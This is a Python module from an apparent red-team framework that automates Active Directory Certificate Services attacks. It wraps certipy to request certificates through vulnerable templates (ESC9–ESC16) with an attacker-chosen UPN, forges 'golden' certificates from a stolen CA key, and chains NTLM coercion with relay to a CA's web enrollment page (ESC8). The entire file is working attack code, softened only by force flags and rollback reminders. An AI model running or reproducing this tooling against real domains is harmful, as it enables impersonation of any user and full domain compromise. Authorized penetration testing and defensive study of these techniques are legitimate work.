"""AD CS ESC9–ESC16 enrollment, golden cert, and ESC8 relay workflow."""

from __future__ import annotations

import json
import subprocess
import sys
from typing import Any

from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.capabilities.coerce import Coerce
from adaf_attack.capabilities.ntlm_relay import NtlmRelay
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import finish, register_advisory_rollback, require_force
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

ESC_EXTRA: dict[str, tuple[str, ...]] = {
    "esc9": (),
    "esc10": (),
    "esc13": (),
    "esc14": (),
    "esc15": ("--application-policies", "1.3.6.1.5.5.7.3.2"),
    "esc16": (),
}


def _load_adcs(session: Session) -> dict[str, Any] | None:
    path = session.path("adcs-enum.json")
    if not path.exists():
        parent = session.root.parent / "adcs-enum.json"
        path = parent if parent.exists() else path
    if not path.exists():
        return None
    try:
        payload = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return payload if isinstance(payload, dict) else None


def _pick_template(adcs: dict[str, Any] | None, tag: str) -> str | None:
    if not adcs:
        return None
    templates = adcs.get("templates") or adcs.get("vulnerable_templates") or []
    for tpl in templates:
        signals = [str(s).upper() for s in (tpl.get("esc_tags") or tpl.get("esc_signals") or [])]
        name = tpl.get("cn") or tpl.get("name") or tpl.get("displayName")
        if name and (tag.upper() in signals or tpl.get(f"{tag.lower()}_candidate")):
            return str(name)
    if templates:
        first = templates[0]
        return str(first.get("cn") or first.get("name") or first.get("displayName") or "") or None
    cands = adcs.get("esc1_candidates") or []
    return str(cands[0]) if cands else None


def _pick_ca(adcs: dict[str, Any] | None) -> str | None:
    if not adcs:
        return None
    cas = adcs.get("cas") or []
    if not cas:
        return None
    first = cas[0]
    if isinstance(first, dict):
        return str(first.get("cn") or first.get("name") or first.get("display_name") or "") or None
    return str(first)


def _run_certipy(argv: list[str], session: Session) -> dict[str, Any]:
    playbook = " ".join("***" if i and argv[i - 1] == "-p" else c for i, c in enumerate(argv))
    session.path("certipy.playbook.txt").write_text(playbook + "\n", encoding="utf-8")
    try:
        proc = subprocess.run(
            argv, cwd=str(session.root), capture_output=True, text=True, timeout=180
        )
    except FileNotFoundError:
        return {"ok": False, "method": "playbook-only", "playbook": playbook}
    except Exception as exc:  # noqa: BLE001
        return {"ok": False, "method": "error", "error": str(exc), "playbook": playbook}
    pfxes = [str(p) for p in session.root.glob("*.pfx")]
    return {
        "ok": proc.returncode == 0,
        "method": "certipy",
        "returncode": proc.returncode,
        "stdout": (proc.stdout or "")[-3000:],
        "stderr": (proc.stderr or "")[-3000:],
        "pfx": pfxes[-1] if pfxes else None,
        "playbook": playbook,
    }


def _enroll(
    cap_id: str,
    target: Target,
    session: Session,
    graph: AttackGraph,
    kwargs: dict[str, Any],
    extra: tuple[str, ...],
) -> dict[str, Any]:
    require_force(cap_id, bool(kwargs.get("_force")))
    adcs = _load_adcs(session)
    template = kwargs.get("template") or _pick_template(adcs, cap_id.upper())
    ca = kwargs.get("ca") or _pick_ca(adcs)
    alt_name = kwargs.get("alt_name") or kwargs.get("upn")
    if not template:
        raise RuntimeError(f"{cap_id} requires -P template=<name> or a prior adcs-enum session")
    if not target.username:
        raise RuntimeError(f"{cap_id} requires --username")
    argv = [
        sys.executable,
        "-m",
        "certipy",
        "req",
        "-u",
        f"{target.username}@{target.domain}",
        "-dc-ip",
        target.dc_ip,
        "-template",
        str(template),
    ]
    if target.password:
        argv.extend(["-p", target.password])
    elif target.hashes:
        argv.extend(["-hashes", target.hashes])
    if ca:
        argv.extend(["-ca", str(ca)])
    if alt_name:
        argv.extend(["-upn", str(alt_name)])
    argv.extend(extra)
    enrolled = _run_certipy(argv, session)
    register_advisory_rollback(
        session,
        kind="cert-enroll",
        target=str(alt_name or target.username),
        rollback="Revoke the enrolled certificate on the CA if the request succeeded.",
    )
    result = {
        "ok": bool(enrolled.get("ok")),
        "template": template,
        "ca": ca,
        "alt_name": alt_name,
        **enrolled,
    }
    if result["ok"]:
        graph.add_edge(
            f"USER@{target.username.upper()}@{target.domain.upper()}",
            f"USER@{target.username.upper()}@{target.domain.upper()}",
            cap_id.upper(),
            template=template,
        )
    return finish(session, graph, cap_id, result, ok=result["ok"])


class _EscBase:
    cap_id = ""
    extra: tuple[str, ...] = ()

    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        kwargs = dict(kwargs)
        kwargs["_force"] = force
        return _enroll(self.cap_id, target, session, graph, kwargs, self.extra)


@register_from_catalog("esc9")
class Esc9(_EscBase):
    cap_id = "esc9"
    extra = ESC_EXTRA["esc9"]


@register_from_catalog("esc10")
class Esc10(_EscBase):
    cap_id = "esc10"
    extra = ESC_EXTRA["esc10"]


@register_from_catalog("esc13")
class Esc13(_EscBase):
    cap_id = "esc13"
    extra = ESC_EXTRA["esc13"]


@register_from_catalog("esc14")
class Esc14(_EscBase):
    cap_id = "esc14"
    extra = ESC_EXTRA["esc14"]


@register_from_catalog("esc15")
class Esc15(_EscBase):
    cap_id = "esc15"
    extra = ESC_EXTRA["esc15"]


@register_from_catalog("esc16")
class Esc16(_EscBase):
    cap_id = "esc16"
    extra = ESC_EXTRA["esc16"]


@register_from_catalog("golden-cert")
class GoldenCert:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("golden-cert", force)
        pfx = kwargs.get("ca_pfx") or kwargs.get("pfx")
        upn = kwargs.get("upn") or kwargs.get("alt_name") or kwargs.get("sam")
        if not pfx:
            raise RuntimeError("golden-cert requires -P ca_pfx=<stolen-ca.pfx>")
        if not upn:
            raise RuntimeError("golden-cert requires -P upn=<user@domain>")
        argv = [
            sys.executable,
            "-m",
            "certipy",
            "forge",
            "-ca-pfx",
            str(pfx),
            "-upn",
            str(upn),
        ]
        if kwargs.get("subject"):
            argv.extend(["-subject", str(kwargs["subject"])])
        forged = _run_certipy(argv, session)
        register_advisory_rollback(
            session,
            kind="cert-enroll",
            target=str(upn),
            rollback="Revoke forged certificates issued from the stolen CA key.",
        )
        result = {"ok": bool(forged.get("ok")), "upn": upn, "ca_pfx": str(pfx), **forged}
        return finish(session, graph, "golden-cert", result, ok=result["ok"])


@register_from_catalog("esc8-relay-workflow")
class Esc8RelayWorkflow:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("esc8-relay-workflow", force)
        ca_host = kwargs.get("ca") or kwargs.get("relay_target") or kwargs.get("host")
        if not ca_host:
            raise RuntimeError("esc8-relay-workflow requires -P ca=<web-enrollment-host>")
        listener = kwargs.get("listener") or target.dc_ip
        coerce_result: dict[str, Any] = {"skipped": "no_host"}
        if kwargs.get("coerce_host") or kwargs.get("allow_hosts"):
            coerce_result = Coerce().run(
                target,
                session,
                graph,
                force=True,
                listener=listener,
                host=kwargs.get("coerce_host"),
                allow_hosts=kwargs.get("allow_hosts") or kwargs.get("coerce_host"),
            )
        relay = NtlmRelay().run(
            target,
            session,
            graph,
            force=True,
            relay_targets=f"http://{ca_host}/certsrv/certfnsh.asp",
            duration_seconds=int(kwargs.get("duration_seconds") or 15),
        )
        result = {
            "ok": bool(relay.get("return_code") is not None),
            "coerce": coerce_result,
            "relay": relay,
        }
        register_advisory_rollback(
            session,
            kind="ntlm-relay",
            target=str(ca_host),
            rollback="Review ESC8 enrollment produced via HTTP relay and revoke issued certs.",
        )
        return finish(session, graph, "esc8-relay-workflow", result, ok=result["ok"])
